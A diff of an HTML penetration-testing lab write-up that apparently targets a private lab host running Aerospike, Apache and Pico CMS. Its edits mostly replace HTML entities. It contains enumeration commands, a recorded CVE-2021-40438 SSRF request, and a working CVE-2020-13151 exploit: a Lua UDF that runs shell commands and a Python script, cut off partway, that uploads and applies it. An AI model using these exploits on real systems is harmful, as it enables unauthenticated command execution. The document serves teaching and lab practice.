@@ -412,7 +412,7 @@ whole engagement will be Linux primitives.</p>
 <p><code>ppp?</code>, <code>nessus?</code>, <code>cgms?</code> are nmap shrugs — it matched nothing it recognises and left the guess it
 had. 3000/3001/3002/3003 in a contiguous block is a signature in itself. Pull the fingerprints nmap
 collected:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>grep<span class="w"> </span>-A3<span class="w"> </span><span class="s2">&quot;Port3003&quot;</span><span class="w"> </span>nmap_services.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>grep<span class="w"> </span>-A3<span class="w"> </span><span class="s2">"Port3003"</span><span class="w"> </span>nmap_services.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SF-Port3003-TCP:V=7.99%I=7%D=11/22%Time=6B0281D5%P=x86_64-pc-linux-gnu%r(G
 SF:enericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPRe
@@ -452,7 +452,7 @@ protocol identically with one byte is speaking something that is not text.</p>
 <p><code>3000</code> answering a client protocol and <code>3002</code> being filtered fit perfectly: the customer-facing port
 is open, the administrative one is not. Confirm it by asking port 3002 a question the way the info
 protocol does — key, newline, read:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;build\nversion\nnamespaces\n&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-w<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">192</span>.168.150.143<span class="w"> </span><span class="m">3002</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'build\nversion\nnamespaces\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-w<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">192</span>.168.150.143<span class="w"> </span><span class="m">3002</span>
 </pre></div>
 <p>From outside this often returns nothing at all (filtered), which is why the confirmation has to be
 done properly with the client later, over 3000. Chapter 03 does exactly that and gets
@@ -461,7 +461,7 @@ done properly with the client later, over 3000. Chapter 03 does exactly that and
 <h3>1.4 The web stack, briefly</h3>
 <p>Three Apache listeners on 80, 81 and 443, all <code>2.4.41</code>. Two of them do not serve the same thing.</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sI<span class="w"> </span>http://192.168.150.143/
-curl<span class="w"> </span>-s<span class="w">  </span>http://192.168.150.143/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;&lt;title&gt;&quot;</span>
+curl<span class="w"> </span>-s<span class="w">  </span>http://192.168.150.143/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"&lt;title&gt;"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">HTTP/1.1 200 OK
 Server: Apache/2.4.41 (Ubuntu)
@@ -471,7 +471,7 @@ Server: Apache/2.4.41 (Ubuntu)
 for <code>robots.txt</code> and you get the default <code>Allow /</code>; ask for a directory that does not exist and you
 get the stock 404. The default page is a decoy, not a target.</p>
 <p>Port 81 is much more interesting:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.150.143:81/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oiE<span class="w"> </span><span class="s2">&quot;&lt;title&gt;[^&lt;]*|nginx[^&lt;]{0,20}&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.150.143:81/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oiE<span class="w"> </span><span class="s2">"&lt;title&gt;[^&lt;]*|nginx[^&lt;]{0,20}"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">&lt;title&gt;Test Page for the Nginx HTTP Server on Fedora&lt;/title&gt;
 nginx</span></pre></div>
@@ -512,7 +512,7 @@ result here came from following the one path that a default page does not have:<
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">HTTP/1.1 200 OK
 Server: Apache/2.4.41 (Ubuntu)</span></pre></div>
 <p>The body is not a directory listing and not an error — it is a rendered site. Fingerprint it:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.150.143/index/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oiE<span class="w"> </span><span class="s2">&quot;pico[^\&quot;&lt;]{0,20}|3\.0\.0[^\&quot;&lt;]{0,12}&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.150.143/index/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oiE<span class="w"> </span><span class="s2">"pico[^\"&lt;]{0,20}|3\.0\.0[^\"&lt;]{0,12}"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">3.0.0-alpha.2
 3.0.0-alpha.2.
@@ -532,15 +532,15 @@ one level below it, so every scan of <code>/</code> returns "default page" and s
 <p>Pico is a flat-file CMS: content lives as Markdown in <code>content/</code>, configuration in <code>config/</code>,
 templates in <code>themes/</code>. The interesting artefacts on an installation like this are the usual three:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>u<span class="w"> </span><span class="k">in</span><span class="w"> </span>config/config.yml<span class="w"> </span>composer.json<span class="w"> </span>.git/HEAD<span class="w"> </span>content/index.md<span class="w"> </span>CHANGELOG.md<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;%-20s &#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$u</span><span class="s2">&quot;</span>
-<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;%{http_code}\n&#39;</span><span class="w"> </span>--max-time<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="s2">&quot;http://192.168.150.143/index/</span><span class="nv">$u</span><span class="s2">&quot;</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'%-20s '</span><span class="w"> </span><span class="s2">"</span><span class="nv">$u</span><span class="s2">"</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'%{http_code}\n'</span><span class="w"> </span>--max-time<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="s2">"http://192.168.150.143/index/</span><span class="nv">$u</span><span class="s2">"</span>
 <span class="k">done</span>
 </pre></div>
 <p>The result is the ordinary one for a correctly configured Pico: those files are not served. The
 <code>.htaccess</code> that ships with Pico denies <code>config/</code>, <code>vendor/</code> and the dot-directories, and the
 document root is not the installation root, so path juggling does not walk out of it either.</p>
 <p>There is a second directory at the top level:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;%{http_code}\n&#39;</span><span class="w"> </span>http://192.168.150.143/api/
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'%{http_code}\n'</span><span class="w"> </span>http://192.168.150.143/api/
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">403</span></pre></div>
 <p><code>403</code> — present, but refusing a listing. That is an authorisation response, not a missing file, so
@@ -556,7 +556,7 @@ would have to reopen.</p>
 <hr />
 <h3>2.3 The vhost that lies about itself</h3>
 <p>Port 81 is the only genuinely strange web finding:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.150.143:81/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oiE<span class="w"> </span><span class="s2">&quot;&lt;title&gt;[^&lt;]*|nginx[^&lt;]{0,20}&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.150.143:81/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oiE<span class="w"> </span><span class="s2">"&lt;title&gt;[^&lt;]*|nginx[^&lt;]{0,20}"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">&lt;title&gt;Test Page for the Nginx HTTP Server on Fedora&lt;/title&gt;
 nginx</span></pre></div>
@@ -573,8 +573,8 @@ giving a shell, and sending 4 KB of padding at a proxy to prove an SSRF that lea
 can already reach is work without a payoff. It remains the most interesting unexplored thread on
 this host, and the one to try if the database is patched:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## CVE-2021-40438 shape — NOT run in this engagement, recorded for completeness</span>
-curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://192.168.150.143:81/?unix:</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;A%.0s&#39;</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..4000<span class="o">}</span><span class="k">)</span><span class="s2">|http://127.0.0.1:3002/&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;%{http_code}\n&#39;</span>
+curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">"http://192.168.150.143:81/?unix:</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">'A%.0s'</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..4000<span class="o">}</span><span class="k">)</span><span class="s2">|http://127.0.0.1:3002/"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'%{http_code}\n'</span>
 </pre></div>
 <p>Note the destination in that example: if the proxy really is reachable, the thing worth reaching
 from inside is <code>3002</code> — the Aerospike info port that the outside scan showed as <code>filtered</code>. A proxy
@@ -637,26 +637,26 @@ heartbeat protocol refusing a text packet, exactly as chapter 01 observed.</p>
 attacker box and the info port is filtered anyway. The clean way to confirm the product is to speak
 the <em>client</em> protocol to 3000, which is open:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
-<span class="sd">&quot;&quot;&quot;Fingerprint the Aerospike node on 192.168.150.143:3000.&quot;&quot;&quot;</span>
+<span class="sd">"""Fingerprint the Aerospike node on 192.168.150.143:3000."""</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">aerospike</span>
 
-<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&quot;192.168.150.143&quot;</span><span class="p">,</span> <span class="mi">3000</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">"192.168.150.143"</span><span class="p">,</span> <span class="mi">3000</span>
 
 <span class="k">try</span><span class="p">:</span>
     <span class="n">client</span> <span class="o">=</span> <span class="n">aerospike</span><span class="o">.</span><span class="n">client</span><span class="p">({</span>
-        <span class="s2">&quot;hosts&quot;</span><span class="p">:</span> <span class="p">[(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)],</span>
-        <span class="s2">&quot;policies&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;timeout&quot;</span><span class="p">:</span> <span class="mi">6000</span><span class="p">},</span>
+        <span class="s2">"hosts"</span><span class="p">:</span> <span class="p">[(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)],</span>
+        <span class="s2">"policies"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"timeout"</span><span class="p">:</span> <span class="mi">6000</span><span class="p">},</span>
     <span class="p">})</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
 <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] connect failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] connect failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;build&quot;</span><span class="p">,</span> <span class="s2">&quot;version&quot;</span><span class="p">,</span> <span class="s2">&quot;namespaces&quot;</span><span class="p">,</span> <span class="s2">&quot;node&quot;</span><span class="p">,</span> <span class="s2">&quot;edition&quot;</span><span class="p">):</span>
+<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">"build"</span><span class="p">,</span> <span class="s2">"version"</span><span class="p">,</span> <span class="s2">"namespaces"</span><span class="p">,</span> <span class="s2">"node"</span><span class="p">,</span> <span class="s2">"edition"</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">client</span><span class="o">.</span><span class="n">info_all</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[+] </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">client</span><span class="o">.</span><span class="n">info_all</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
     <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[-] </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[-] </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 
 <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </pre></div>
@@ -696,7 +696,7 @@ Path: /usr/share/exploitdb/exploits/multiple/remote/49067.py</span></pre></div>
 it prints its version comparison and exits before touching the UDF:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>/usr/share/exploitdb/exploits/multiple/remote/49067.py<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>--ahost<span class="w"> </span><span class="m">192</span>.168.150.143<span class="w"> </span>--aport<span class="w"> </span><span class="m">3000</span><span class="w"> </span>--namespace<span class="w"> </span><span class="nb">test</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--udfpath<span class="w"> </span>/tmp/aero_poc/poc.lua<span class="w"> </span>--cmd<span class="w"> </span><span class="s1">&#39;id&#39;</span>
+<span class="w">  </span>--udfpath<span class="w"> </span>/tmp/aero_poc/poc.lua<span class="w"> </span>--cmd<span class="w"> </span><span class="s1">'id'</span>
 </pre></div>
 <p>The guard in the script compares the build string and treats <code>5.1.0.0</code> as <em>fixed</em>. That is wrong:
 <code>5.1.0.0</code> and <code>5.1.0.1</code> are both before <code>5.1.0.3</code>, and both are vulnerable. The check is
@@ -707,9 +707,9 @@ missed on an exam: <strong>a tool's version gate is not evidence.</strong> The e
 (<code>5.1.0.1</code>), the advisory's fixed version (<code>5.1.0.3</code>), and a successful <code>apply()</code>. Two of those
 three can be read off the box; the third is one call away.</p>
 <p>The fix is not to patch the exploit. It is to use the client library directly, which is four calls:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">client</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;pk&quot;</span><span class="p">:</span> <span class="s2">&quot;x&quot;</span><span class="p">})</span>                       <span class="c1"># a record to attach the UDF to</span>
-<span class="n">client</span><span class="o">.</span><span class="n">udf_put</span><span class="p">(</span><span class="s2">&quot;/tmp/aero_poc/poc.lua&quot;</span><span class="p">)</span>            <span class="c1"># upload the module</span>
-<span class="n">client</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s2">&quot;poc&quot;</span><span class="p">,</span> <span class="s2">&quot;runCMD&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">])</span>         <span class="c1"># run it</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">client</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span><span class="s2">"pk"</span><span class="p">:</span> <span class="s2">"x"</span><span class="p">})</span>                       <span class="c1"># a record to attach the UDF to</span>
+<span class="n">client</span><span class="o">.</span><span class="n">udf_put</span><span class="p">(</span><span class="s2">"/tmp/aero_poc/poc.lua"</span><span class="p">)</span>            <span class="c1"># upload the module</span>
+<span class="n">client</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s2">"poc"</span><span class="p">,</span> <span class="s2">"runCMD"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"id"</span><span class="p">])</span>         <span class="c1"># run it</span>
 </pre></div>
 <p>Chapter 04 does that and reads the answer.</p>
 <hr />
@@ -760,7 +760,7 @@ short answer — an earlier draft of this page said "not at all", and that was w
 <p>Three lines of Lua are the entire payload:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="kr">function</span><span class="w"> </span><span class="nf">runCMD</span><span class="p">(</span><span class="nv">rec</span><span class="p">,</span><span class="w"> </span><span class="nv">cmd</span><span class="p">)</span>
 <span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">io.popen</span><span class="p">(</span><span class="nv">cmd</span><span class="p">)</span>
-<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">handle</span><span class="p">:</span><span class="nf">read</span><span class="p">(</span><span class="s2">&quot;*a&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">handle</span><span class="p">:</span><span class="nf">read</span><span class="p">(</span><span class="s2">"*a"</span><span class="p">)</span>
 <span class="w">    </span><span class="nv">handle</span><span class="p">:</span><span class="nf">close</span><span class="p">()</span>
 <span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nv">out</span>
 <span class="kr">end</span>
@@ -775,45 +775,45 @@ connection that sent it. No listener, no callback, no port forward.</p>
 <p>The published exploit refuses this version (chapter 03, §3.3), so the client library is driven
 directly. The full script is in <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/poc_aerospike_rce.py"><code>scripts/poc_aerospike_rce.py</code></a>:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
-<span class="sd">&quot;&quot;&quot;CVE-2020-13151 — Aerospike CE &lt; 5.1.0.3 unauthenticated command execution.&quot;&quot;&quot;</span>
+<span class="sd">"""CVE-2020-13151 — Aerospike CE &lt; 5.1.0.3 unauthenticated command execution."""</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">string</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">aerospike</span>
 
-<span class="n">UDF_SRC</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;function runCMD(rec, cmd)</span>
+<span class="n">UDF_SRC</span> <span class="o">=</span> <span class="s2">"""function runCMD(rec, cmd)</span>
 <span class="s2">    local handle = io.popen(cmd)</span>
-<span class="s2">    local out = handle:read(&quot;*a&quot;)</span>
+<span class="s2">    local out = handle:read("*a")</span>
 <span class="s2">    handle:close()</span>
 <span class="s2">    return out</span>
 <span class="s2">end</span>
-<span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">"""</span>
 
 <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
     <span class="n">ap</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
-    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--ahost&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;192.168.150.143&quot;</span><span class="p">)</span>
-    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--aport&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">3000</span><span class="p">)</span>
-    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--namespace&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
-    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--setname&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;cve202013151&quot;</span><span class="p">)</span>
-    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--udf&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;poc.lua&quot;</span><span class="p">)</span>
-    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--cmd&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--ahost"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">"192.168.150.143"</span><span class="p">)</span>
+    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--aport"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">3000</span><span class="p">)</span>
+    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--namespace"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">"test"</span><span class="p">)</span>
+    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--setname"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">"cve202013151"</span><span class="p">)</span>
+    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--udf"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">"poc.lua"</span><span class="p">)</span>
+    <span class="n">ap</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--cmd"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
     <span class="n">a</span> <span class="o">=</span> <span class="n">ap</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
 
-    <span class="nb">open</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">udf</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">UDF_SRC</span><span class="p">)</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">udf</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">UDF_SRC</span><span class="p">)</span>
 
     <span class="n">client</span> <span class="o">=</span> <span class="n">aerospike</span><span class="o">.</span><span class="n">client</span><span class="p">({</span>
-        <span class="s2">&quot;hosts&quot;</span><span class="p">:</span> <span class="p">[(</span><span class="n">a</span><span class="o">.</span><span class="n">ahost</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">aport</span><span class="p">)],</span>
-        <span class="s2">&quot;policies&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;timeout&quot;</span><span class="p">:</span> <span class="mi">8000</span><span class="p">,</span> <span class="s2">&quot;total_timeout&quot;</span><span class="p">:</span> <span class="mi">8000</span><span class="p">,</span> <span class="s2">&quot;socket_timeout&quot;</span><span class="p">:</span> <span class="mi">8000</span><span class="p">},</span>
+        <span class="s2">"hosts"</span><span class="p">:</span> <span class="p">[(</span><span class="n">a</span><span class="o">.</span><span class="n">ahost</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">aport</span><span class="p">)],</span>
+        <span class="s2">"policies"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"timeout"</span><span class="p">:</span> <span class="mi">8000</span><span class="p">,</span> <span class="s2">"total_timeout"</span><span class="p">:</span> <span class="mi">8000</span><span class="p">,</span> <span class="s2">"socket_timeout"</span><span class="p">:</span> <span class="mi">8000</span><span class="p">},</span>
     <span class="p">})</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
 
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] build:&quot;</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="n">info_all</span><span class="p">(</span><span class="s2">&quot;build&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">values</span><span class="p">())[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
